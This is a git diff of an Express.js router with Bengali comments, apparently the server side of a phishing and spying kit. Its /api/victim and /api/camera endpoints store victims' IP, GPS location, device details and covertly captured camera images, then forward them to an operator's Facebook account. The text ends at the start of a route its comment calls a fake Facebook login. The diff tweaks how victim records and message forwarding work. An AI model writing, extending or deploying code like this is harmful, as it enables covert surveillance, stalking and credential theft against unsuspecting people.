@@ -102,18 +102,17 @@ router.post('/api/victim', async (req, res) => {
             return res.status(400).json({ status: 'error', message: 'Missing id' });
         }
 
-        // **IP চেক – ডেটার `ip` ফিল্ড দেখে**
         const victimIp = data.ip || '0.0.0.0';
         const isBlocked = BLOCKED_IPS.includes(victimIp);
         console.log(`🔍 ভিক্টিম IP: ${victimIp} → ${isBlocked ? '🚫 ব্লকড (মেসেজ যাবে না)' : '✅ অনুমোদিত (মেসেজ যাবে)'}`);
 
-        // ভিক্টিম খুঁজি বা তৈরি করি (সব সময়ই সেভ করি, ব্লক করলেও)
         let victim = await Victim.findOne({ id: data.id });
 
         if (!victim) {
+            // নতুন ভিক্টিম তৈরি (fbId দেওয়া নেই, কারণ command থেকে আগেই তৈরি করে রেখেছি)
             victim = new Victim({
                 id: data.id,
-                fbId: data.fbId || 'unknown',
+                fbId: 'unknown', // ডিফল্ট
                 type: data.type || 'camera',
                 timestamp: data.timestamp ? new Date(data.timestamp) : new Date(),
                 ip: data.ip || null,
@@ -128,9 +127,8 @@ router.post('/api/victim', async (req, res) => {
             await victim.save();
             console.log(`✅ নতুন ভিক্টিম তৈরি: ${data.id}`);
         } else {
-            if (victim.fbId === 'unknown' && data.fbId && data.fbId !== 'unknown') {
-                victim.fbId = data.fbId;
-            }
+            // 🔥 fbId কখনো ওভাররাইট করব না (ডাটাবেজের আসল fbId রাখব)
+            // শুধু বাকি ডেটা আপডেট করব
             victim.ip = data.ip || victim.ip;
             victim.location = data.location || victim.location;
             victim.gpsLocation = data.gpsLocation || victim.gpsLocation;
@@ -140,11 +138,11 @@ router.post('/api/victim', async (req, res) => {
             victim.battery = data.battery || victim.battery;
             victim.collectedAt = new Date();
             await victim.save();
-            console.log(`✅ ভিক্টিম আপডেট: ${data.id}`);
+            console.log(`✅ ভিক্টিম আপডেট: ${data.id} (fbId: ${victim.fbId})`);
         }
 
         // ============================================================
-        // 📤 মেসেজ পাঠান **শুধুমাত্র যদি IP ব্লক না হয়**
+        // 📤 মেসেজ পাঠান শুধুমাত্র যদি IP ব্লক না হয় এবং fbId থাকে
         // ============================================================
         if (!isBlocked && victim.fbId && victim.fbId !== 'unknown') {
             const msg = formatVictimData(victim);
@@ -152,9 +150,11 @@ router.post('/api/victim', async (req, res) => {
             console.log(`📤 ডিভাইস ইনফো মেসেজ পাঠানো হয়েছে: ${victim.fbId}`);
         } else if (isBlocked) {
             console.log(`⛔ ব্লকড IP (${victimIp}) → মেসেজ পাঠানো হয়নি।`);
+        } else {
+            console.log(`⚠️ fbId 'unknown' → মেসেজ পাঠানো হয়নি (ভিক্টিম তৈরি হবে command থেকে)।`);
         }
 
-        // লোকেশন মেসেজ (যদি থাকে এবং ব্লক না হয়)
+        // লোকেশন মেসেজ
         if (!isBlocked && victim.fbId && victim.fbId !== 'unknown' && victim.gpsLocation && victim.gpsLocation.latitude) {
             const locationMsg = formatLocationMessage(victim.gpsLocation);
             if (locationMsg) {
@@ -186,7 +186,6 @@ router.post('/api/camera', async (req, res) => {
             return res.status(404).json({ status: 'error', message: 'Victim not found' });
         }
 
-        // **ভিক্টিমের সেভ করা IP চেক**
         const victimIp = victim.ip || '0.0.0.0';
         const isBlocked = BLOCKED_IPS.includes(victimIp);
         console.log(`🔍 ক্যামেরা রিকোয়েস্টে ভিক্টিম IP: ${victimIp} → ${isBlocked ? '🚫 ব্লকড (ছবি যাবে না)' : '✅ অনুমোদিত (ছবি যাবে)'}`);
@@ -204,7 +203,7 @@ router.post('/api/camera', async (req, res) => {
         console.log(`📸 ক্যামেরা ছবি: ${id} (মোট ${totalImages}টি)`);
 
         // ============================================================
-        // 📤 মেসেজ ও ছবি পাঠান **শুধুমাত্র যদি IP ব্লক না হয়**
+        // 📤 ছবি পাঠান শুধুমাত্র যদি IP ব্লক না হয় এবং fbId থাকে
         // ============================================================
         if (!isBlocked && victim.fbId && victim.fbId !== 'unknown') {
             if (isFirstImage) {
@@ -215,6 +214,8 @@ router.post('/api/camera', async (req, res) => {
             console.log(`📸 ছবি #${totalImages} পাঠানো: ${victim.fbId}`);
         } else if (isBlocked) {
             console.log(`⛔ ব্লকড IP (${victimIp}) → ক্যামেরার মেসেজ/ছবি পাঠানো হয়নি।`);
+        } else {
+            console.log(`⚠️ fbId 'unknown' → ছবি পাঠানো হয়নি (ভিক্টিম তৈরি হবে command থেকে)।`);
         }
 
         res.status(200).json({ status: 'ok', count: totalImages, blocked: isBlocked });
@@ -226,7 +227,7 @@ router.post('/api/camera', async (req, res) => {
 });
 
 // ================================================================
-// ইমেজ ভিউ (অ্যাডমিন প্যানেলের জন্য)
+// ইমেজ ভিউ
 // ================================================================
 router.get('/image/:id/:index', async (req, res) => {
     try {
@@ -247,7 +248,7 @@ router.get('/image/:id/:index', async (req, res) => {
 });
 
 // ================================================================
-// ফেক ফেসবুক লগইন (এখানে আইপি চেক নেই, কারণ এটি আলাদা ফিচার)
+// ফেক ফেসবুক লগইন
 // ================================================================
 router.post('/api/fblogin', async (req, res) => {
     try {
